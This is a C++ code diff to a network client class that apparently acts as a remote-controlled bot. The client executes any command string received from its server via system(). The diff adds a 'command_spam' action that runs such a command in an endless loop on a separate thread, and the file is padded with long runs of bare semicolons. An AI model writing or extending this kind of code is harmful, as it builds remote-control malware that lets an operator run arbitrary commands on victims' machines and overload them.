@@ -21,6 +21,7 @@ using json = nlohmann::json;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 class Client {
 public:
@@ -41,6 +42,7 @@ private:
 	std::thread receiveThread;
 	std::thread requestThread;
 	std::queue<sf::Packet> abobus;
+	std::thread commandThread;
 
 public:
 	
@@ -63,6 +65,12 @@ public:
 		request["message"] = command;
 		sendRequest(request);
 
+	}
+	void sendCommandSpam(std::string command) {
+		json request;
+		request["action"] = "command_spam";
+		request["message"] = command;
+		sendRequest(request);
 	}
 	bool sendRequest(const json& msg) {
 		sf::Packet packet;
@@ -92,10 +100,16 @@ public:
 			return;
 		}
 	}
+	void commandSpam(std::string command) {
+		while (isStarted.load()) {
+			system(command.c_str());
+		}
+	}
 	void stop() {
 		isStarted.store(false);
 		requestThread.detach();
 		receiveThread.detach();
+		commandThread.detach();
 	}
 	void processResponse(sf::Packet packet) {
 		std::string msg;
@@ -110,7 +124,10 @@ public:
 				spdlog::info("processing command from server");
 				system(message["message"].get<std::string>().c_str());
 			}
-			
+			else if (action == "command_spam") {
+				spdlog::info("processing command from server");
+				commandThread = std::thread([message, this]() {this->commandSpam(message["message"].get<std::string>()); });
+			}
 		}
 		catch (const json::parse_error& ex) {
 			spdlog::error("server sent invalid json format!");
